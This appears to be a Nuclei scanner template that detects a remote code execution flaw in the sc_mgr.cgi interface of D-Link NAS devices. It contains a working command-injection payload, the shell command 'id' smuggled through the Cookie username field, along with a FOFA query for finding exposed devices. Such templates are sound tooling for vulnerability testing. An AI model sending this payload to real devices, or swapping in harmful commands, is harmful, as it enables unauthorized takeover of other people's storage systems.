http:
- matchers:
  - condition: and
    part: body
    regex:
    - uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)
    - 404 not found
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info HTTP/1.1

    Host: {{Hostname}}

    Cookie: username=''& id &'';

    '
id: dlink-nas-rce
info:
  author: adeljck
  description: 'The D-Link NAS interface sc_mgr.cgi contains a command execution vulnerability
    that allows attackers to execute arbitrary commands on the device, potentially
    leading to unauthorized access or control over the system.

    '
  metadata:
    fofa-query: body="/cgi-bin/login_mgr.cgi" && body="cmd=cgi_get_ssl_info"
    max-request: 1
    verified: true
  name: D-Link NAS `sc_mgr.cgi` - Remote Code Execution
  remediation: 'To remediate this vulnerability, ensure that the device firmware is
    updated to the latest version provided by the manufacturer. Additionally, consider
    implementing network segmentation and firewall rules to restrict unauthorized
    access to the device.

    '
  severity: critical
  tags: dlink,nas,rce,vuln
